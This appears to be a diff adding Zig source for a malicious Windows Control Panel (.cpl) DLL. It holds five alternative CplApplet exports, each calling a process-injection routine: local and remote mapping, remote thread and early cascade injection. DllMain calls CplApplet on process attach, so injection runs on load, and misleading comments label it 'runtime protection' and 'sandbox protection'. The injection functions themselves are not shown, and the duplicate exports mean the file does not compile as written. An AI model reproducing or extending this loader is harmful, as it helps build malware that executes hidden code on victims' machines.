@@ -1,0 +1,92 @@
+// LOCAL MAPPING INJECTION 
+pub export fn CplApplet(hwndCpl: ?windows.HWND, msg: windows.UINT, lParam1: windows.LPARAM, lParam2: windows.LPARAM) callconv(.C) windows.LONG  {
+   
+    // enable runtime protection
+    _ = hwndCpl;
+    _ = msg;
+    _ = lParam1;
+    _ = lParam2;
+    local_map_injection();
+    return 1;
+}
+// END OF LOCAL MAPPING INJECTION 
+
+
+// HIJACK THREAD INJECTION 
+pub export fn CplApplet(hwndCpl: ?windows.HWND, msg: windows.UINT, lParam1: windows.LPARAM, lParam2: windows.LPARAM) callconv(.C) windows.LONG  {
+    
+    // enable runtime protection
+    _ = hwndCpl;
+    _ = msg;
+    _ = lParam1;
+    _ = lParam2;
+    //createThreadAndExecute(sampleProcedure);
+    run_cascade_injection();
+   // _ = user32.MessageBoxA(null, "Hey there, I am now your control panel item you know.", "Control Panel", 0);
+
+    return 1;
+}
+// END OF HIJACK THREAD INJECTION 
+
+// REMOTE MAPPING INJECTION 
+pub export fn CplApplet(hwndCpl: ?windows.HWND, msg: windows.UINT, lParam1: windows.LPARAM, lParam2: windows.LPARAM) callconv(.C) windows.LONG  {
+  
+    // enable runtime protection
+    _ = hwndCpl;
+    _ = msg;
+    _ = lParam1;
+    _ = lParam2;
+    remote_map_injection();
+    return 1;
+}
+// END OF REMOTE MAPPING INJECTION  
+
+// REMOTE THREAD INJECTION 
+pub export fn CplApplet(hwndCpl: ?windows.HWND, msg: windows.UINT, lParam1: windows.LPARAM, lParam2: windows.LPARAM) callconv(.C) windows.LONG  {
+    
+    // enable runtime protection
+    _ = hwndCpl;
+    _ = msg;
+    _ = lParam1;
+    _ = lParam2;
+    remote_thread_injection();
+    return 1;
+}
+// END OF REMOTE THREAD INJECTION   
+
+
+
+// EARLY CASCADE INJECTION 
+pub export fn CplApplet(hwndCpl: ?windows.HWND, msg: windows.UINT, lParam1: windows.LPARAM, lParam2: windows.LPARAM) callconv(.C) windows.LONG  {
+    
+    // enable runtime protection
+    _ = hwndCpl;
+    _ = msg;
+    _ = lParam1;
+    _ = lParam2;
+      run_cascade_injection();
+    return 1;
+}
+// END OF EARLY CASCADE INJECTION
+
+
+
+
+
+
+// CPL WRAPPER
+pub export fn DllMain(hInstance: windows.HINSTANCE, dwReason: windows.DWORD, lpReserved: ?windows.LPVOID) callconv(WINAPI) windows.BOOL {
+    _ = hInstance;
+    _ = lpReserved;
+    switch (dwReason) {
+        win32.DLL_PROCESS_ATTACH => {
+            // Sandbox protection option enabled?
+            _ = CplApplet(null, 0, 0, 0);
+           
+        },
+        win32.DLL_PROCESS_DETACH => {},
+        else => {},
+    }
+    return windows.TRUE;
+}
+// END OF CPL WRAPPER  
